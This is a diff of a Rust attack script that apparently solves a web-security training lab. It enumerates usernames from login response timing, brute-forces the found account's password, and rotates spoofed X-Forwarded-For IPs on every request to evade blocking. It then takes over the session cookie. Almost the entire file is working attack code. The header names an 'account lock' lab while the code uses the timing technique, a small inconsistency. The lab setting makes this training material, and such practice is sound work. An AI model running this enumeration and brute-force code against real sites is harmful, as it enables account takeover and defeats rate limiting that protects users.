@@ -1,119 +1,72 @@
-/****************************************************************
+/*******************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
+* Lab: Username enumeration via account lock
 *
-* Date: 27/8/2023
+* Hack Steps: 
+*      1. Read usernames and passwords lists
+*      2. Change X-Forwarded-For header to a random IP in every 
+*         request to bypass blocking
+*      3. Try to find a valid username via response timing
+*      4. Brute force the password of that valid username
+*      5. Login with the valid credentials
 *
-* Lab: Username enumeration via response timing
-*
-* Steps: 1. Enumerate a valid username via response timing
-*        2. Brute force password of that valid username
-*
-*****************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+********************************************************************/
 use lazy_static::lazy_static;
-use rand::{self, Rng};
+use rand::Rng;
+use regex::{self, Regex};
 use reqwest::{
-    blocking::{Client, ClientBuilder},
+    blocking::{Client, ClientBuilder, Response},
     redirect::Policy,
+    Error,
 };
 use std::{
     collections::HashMap,
-    fs::{self, OpenOptions},
+    fs::{self},
     io::{self, Write},
-    ops::Add,
-    rc::Rc,
-    sync::{
-        atomic::{AtomicUsize, Ordering},
-        Mutex,
-    },
-    thread,
+    process,
     time::{self, Duration, Instant},
 };
 use text_colorizer::Colorize;
 
-/******************
-* Global variables
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0aed009e03a3f20b8288976500b90016.web-security-academy.net";
+
 lazy_static! {
-    static ref FAILED_USERS: Mutex<Vec<String>> = Mutex::new(Vec::new());
-    static ref FAILED_PASSWORDS: Mutex<Vec<String>> = Mutex::new(Vec::new());
-    static ref USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
-    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
-    static ref FAILED_USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
-    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/******************
-* Main Function
-*******************/
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a4b00af03053a4d827e3849007d003b.web-security-academy.net/login";
+    print!("⦗1⦘ Reading usernames list.. ");
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let usernames_list = read_list("../../usernames.txt"); // Make sure the file exist in your root directory or change its path accordingly
 
-    // read usernames as one big string
-    // change the path to your list
-    let usernames = fs::read_to_string("/home/ahmed/users").unwrap();
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Reading password list.. ");
 
-    // read passwords as one big string
-    // change the path to your list
-    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap();
+    let password_list = read_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
 
-    // capture the time before enumeration
-    let start_time = time::Instant::now();
+    println!("{}", "OK".green());
+    println!("⦗3⦘ Trying to find a valid username.. ");
 
-    // try to get a valid username
-    let valid_user = get_valid_username(start_time, url, &client, usernames);
+    let valid_user = try_to_find_valid_username(&usernames_list);
 
-    // set valid password to an empty string
-    let mut valid_password = Some(String::new());
+    println!("\n🗹 Valid username: {}", valid_user.green());
+    println!("⦗4⦘ Brute forcing password.. ");
 
-    // if you found a valid one
-    if let Some(user) = valid_user {
-        // brute force his password
-        valid_password = brute_force_password(start_time, url, client, &user, passwords);
+    let (valid_password, new_session) = brute_force_password(&valid_user, &password_list);
 
-        // if you found a valid password
-        match valid_password {
-            Some(password) => {
-                print_valid_credentials(&user, &password);
+    println!("\n🗹 Valid username: {}", valid_user.green());
+    println!("🗹 Valid password: {}", valid_password.green());
+    print!("⦗5⦘ Logging in.. ");
 
-                // save results  to a file in the current working directory
-                // you can change this name to what you want
-                save_results(start_time, "results", &user, &password);
-            }
-            None => {
-                println!("{}", "[!] Couldn't find valid password".red());
+    fetch_with_session("/my-account", &new_session);
 
-                // save results  to a file in the current working directory
-                save_results(start_time, "results", &user, "");
-            }
-        }
-    } else {
-        println!("{}", "[!] Couldn't find valid username".red());
-
-        // save results  to a file in the current working directory
-        save_results(start_time, "results", "", "");
-    }
-
-    // print some useful information to the terminal
-    print_finish_message(start_time);
-
-    // print the failed request to try them later
-    print_failed_requests();
+    println!("{}", "OK".green());
+    print_finish_message();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -121,309 +74,122 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/***********************************************************************
-* Function used to enumerate usernames
-* Parameters:
-    - Instant: to ouptut an updated elapsed time to the terminal
-    - URL: the URL of the lab
-    - client: the client we build using the build_client() function
-    - usernames: the list of gathered usernames
-************************************************************************/
-fn get_valid_username(
-    start_time: Instant,
-    url: &str,
-    client: &Client,
-    usernames: String,
-) -> Option<String> {
-    println!("[#] Enumerate usernames..");
+fn read_list(file_path: &str) -> Vec<String> {
+    let passwords_big_string = fs::read_to_string(file_path)
+        .expect(&format!("Failed to read the file: {}", file_path.red()));
+    passwords_big_string.lines().map(|p| p.to_owned()).collect()
+}
 
-    // get total number of usernames to try
-    let total_counts = usernames.lines().count();
+fn try_to_find_valid_username(usernames: &Vec<String>) -> String {
+    let big_password = "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw";
+    let total_count = usernames.iter().count();
 
-    // iterate over usernames and their indices
-    for (index, user) in usernames.lines().enumerate() {
-        // update the success counter
-        let success_counter = USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
+    for (counter, username) in usernames.into_iter().enumerate() {
+        print_progress(counter, total_count, &username);
 
-        // get the fail counter value
-        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
+        let start_time = Instant::now();
+        let try_to_login = login(&username, big_password);
 
-        // calculate the elapsed time
-        let elapsed_time = start_time.elapsed().as_secs() / 60;
+        if try_to_login.is_ok() {
+            let elapsed_time = start_time.elapsed().as_secs();
 
-        // print the update inforamtion to the terminal
-        print_progress(
-            elapsed_time,
-            fail_counter,
-            success_counter,
-            total_counts,
-            user,
-        );
-
-        // set a big random password to make server take more time in computing
-        let big_password = "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw";
-
-        // the POST data to send
-        let data = HashMap::from([("username", user), ("password", big_password)]);
-
-        // capture the time before making the request
-        let mut request_start_time = Instant::now();
-
-        // try to login
-        // change IP in every request to avoid blocking
-        let mut login = client
-            .post(url)
-            .form(&data)
-            .header("X-Forwarded-For", get_random_ip())
-            .send();
-
-        // if the request succeeded
-        if let Ok(res) = login {
-            // calculate the completion time of the request
-            let request_elapsed_time = request_start_time.elapsed().as_secs();
-
-            // if the request take more than 5 seconds; an indicator of a success username
-            if request_elapsed_time > 5 {
-                // return that valid user
-                return Some(user.to_string());
+            if elapsed_time > 5 {
+                return username.to_owned();
+            } else {
+                continue;
             }
         } else {
-            // if request failed for unknown reason, try to send it again
-            request_start_time = Instant::now();
-
-            login = client
-                .post(url)
-                .form(&data)
-                .header("X-Forwarded-For", get_random_ip())
-                .send();
-
-            // if the request succeeded
-            if let Ok(res) = login {
-                let elapsed_time = request_start_time.elapsed().as_secs();
-
-                if elapsed_time > 5 {
-                    // return that valid user
-                    return Some(user.to_string());
-                }
-            } else {
-                // if the request failed after 2 tries, save it to try later
-                // add 1 to failed counter
-                FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
-
-                // save this user to a list to try it later
-                FAILED_USERS.lock().unwrap().push(user.to_string());
-            }
+            print_failed_request(&username);
+            continue;
         }
     }
-    println!("");
-    None
+
+    println!("{}", "\n⦗!⦘ No valid username was found".red());
+    process::exit(1);
 }
 
-/***********************************************************************
-* Function used to brute force passwords
-* Parameters:
-    - Instant: to ouptut an updated elapsed time to the terminal
-    - URL: the URL of the lab
-    - client: the client we build using the build_client() function
-    - passwords: the list of gathered usernames
-    - valid user: the valid user to brute force his password
-************************************************************************/
-fn brute_force_password(
-    start_time: Instant,
-    url: &str,
-    client: Client,
-    valid_user: &str,
-    passwords: String,
-) -> Option<String> {
-    println!("[#] Brute forcing password..");
-    println!(
-        "{}: {}",
-        "✅ Valid user".white().bold(),
-        valid_user.green().bold()
-    );
+fn brute_force_password(valid_user: &str, password_list: &Vec<String>) -> (String, String) {
+    let total_count = password_list.iter().count();
 
-    // get total number of passwords to try
-    let total_counts = passwords.lines().count();
+    for (counter, password) in password_list.iter().enumerate() {
+        print_progress(counter, total_count, password);
 
-    // iterate over all passwords and their indices
-    for (index, password) in passwords.lines().enumerate() {
-        // update the success counter
-        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
+        let try_to_login = login(valid_user, password);
 
-        // get the fail counter value
-        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
-
-        // calculate the elapsed time
-        let elapsed_time = start_time.elapsed().as_secs() / 60;
-
-        // print the updated info
-        print_progress(
-            elapsed_time,
-            fail_counter,
-            success_counter,
-            total_counts,
-            password,
-        );
-
-        // the POST data to send
-        let data = HashMap::from([("username", valid_user), ("password", password)]);
-
-        // try to login
-        let mut login = client
-            .post(url)
-            .form(&data)
-            .header("X-Forwarded-For", get_random_ip())
-            .send();
-
-        // if the request succeeded
-        if let Ok(res) = login {
-            // if a redirection happens ( correct password )
-            if res.status().as_u16() == 302 {
-                println!("");
-
-                // return the valid password
-                return Some(password.to_string());
+        if let Ok(response) = try_to_login {
+            if response.status().as_u16() == 302 {
+                let new_session = get_session_cookie(&response);
+                return (password.to_owned(), new_session);
+            } else {
+                continue;
             }
         } else {
-            // if the request failed, try to send it again
-            login = client
-                .post(url)
-                .form(&data)
-                .header("X-Forwarded-For", get_random_ip())
-                .send();
-            if let Ok(res) = login {
-                if res.status().as_u16() == 302 {
-                    println!("");
-                    return Some(password.to_string());
-                }
-            } else {
-                // if the repeated request also failed,
-                // upate the counter and save the password to try it later
-                FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
-                FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
-            }
+            print_failed_request(&password);
+            continue;
         }
     }
-    println!("");
-    None
+
+    println!("{}", "\n⦗!⦘ No valid passwords was found".red());
+    process::exit(1);
 }
 
-/***************************************
-* Function used to print the update info
-* to the terminal in a nice format
-****************************************/
-#[inline(always)]
-fn print_progress(
-    elapsed_time: u64,
-    fail_counter: usize,
-    success_counter: usize,
-    total_counts: usize,
-    text: &str,
-) {
-    print!(
-        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
-        "Elapsed".yellow().bold(),
-        elapsed_time,
-        "Failed".red().bold(),
-        fail_counter,
-        "Trying".white().bold(),
-        success_counter,
-        total_counts,
-        text.blue().bold()
-    );
-    io::stdout().flush().unwrap();
+fn login(username: &str, password: &str) -> Result<Response, Error> {
+    let data = HashMap::from([("username", username), ("password", password)]);
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .header("X-Forwarded-For", get_random_ip())
+        .form(&data)
+        .send()
 }
 
-/********************************************************
-* Function used to print the valid username and password
-*********************************************************/
-#[inline(always)]
-fn print_valid_credentials(valid_user: &str, valid_password: &str) {
-    println!(
-        "\n{}: username: {}, password: {}",
-        "✅ Login successfully".white(),
-        valid_user.green().bold(),
-        valid_password.green().bold()
-    );
-}
-
-/****************************************************
-* Function used to print finish time
-*****************************************************/
-#[inline(always)]
-fn print_finish_message(start_time: Instant) {
-    println!(
-        "\n{}: {:?} minutes",
-        "✅ Finished in".green().bold(),
-        start_time.elapsed().as_secs() / 60
-    );
-}
-
-/****************************************************
-* Function used to print failed usernames and password
-* that we tried 2 times earlier and also failed
-*****************************************************/
-#[inline(always)]
-fn print_failed_requests() {
-    let failed_users = FAILED_USERS.lock().unwrap();
-    println!(
-        "\n\n{}: {} \n{}: {:?}",
-        "[!] Failed users count".red().bold(),
-        failed_users.len().to_string().yellow().bold(),
-        "[!] Failed users".red().bold(),
-        failed_users
-    );
-    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
-    println!(
-        "\n\n{}: {} \n{}: {:?}",
-        "[!] Failed password count".red().bold(),
-        failed_passwords.len().to_string().yellow().bold(),
-        "[!] Failed password".red().bold(),
-        failed_passwords
-    )
-}
-
-/*********************************************
-* Function used to save results to a txt file
-**********************************************/
-fn save_results(start_time: Instant, file_name: &str, valid_user: &str, valid_password: &str) {
-    let failed_users = FAILED_USERS.lock().unwrap();
-    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
-    let to_save = format!(
-        "✅ Finished in: {elapsed_time:?} minutes \n\n\
-    Username: {user}, Password: {pass} \n\n\
-    [!] Failed users count: {fusers_count} \n\
-    [!] Failed users: {fusers:?} \n\n\
-    [!] Failed passwords count: {fpasswords_count} \n\
-    [!] Failed passwords: {fpasswords:?} \n\n",
-        elapsed_time = start_time.elapsed().as_secs() / 60,
-        fusers_count = failed_users.len(),
-        fusers = failed_users,
-        fpasswords = failed_passwords,
-        fpasswords_count = failed_passwords.len(),
-        user = valid_user,
-        pass = valid_password
-    );
-    let new_file = fs::File::create(file_name);
-    if let Ok(mut file_created) = new_file {
-        write!(file_created, "{}", to_save);
-        println!(
-            "\n{}: {}",
-            "Restults was saved to".yellow().bold(),
-            file_name.green().bold()
-        )
-    } else {
-        println!("\n{}", "[!] Couldn't create new file to save results".red());
-    }
-}
-
-/*************************************************
-* Function used to generate random IP on each call
-**************************************************/
 fn get_random_ip() -> String {
     let a = rand::thread_rng().gen_range(2..254);
     let b = rand::thread_rng().gen_range(2..254);
     let c = rand::thread_rng().gen_range(2..254);
     let d = rand::thread_rng().gen_range(2..254);
     format!("{a}.{b}.{c}.{d}")
+}
+
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("{}", "Failed to fetch carlos profile".red()))
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn print_progress(counter: usize, total_count: usize, text: &str) {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    print!(
+        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
+        elapsed_time.yellow(),
+        counter + 1,
+        text.blue()
+    );
+    io::stdout().flush().unwrap();
+}
+
+fn print_finish_message() {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    println!("🗹 Finished in: {} seconds", elapsed_time.yellow());
+    println!("🗹 The lab should be marked now as {}", "solved".green());
+}
+
+fn print_failed_request(text: &str) {
+    println!("{} {}", "\n⦗!⦘ Failed to try:".red(), text.red())
 }
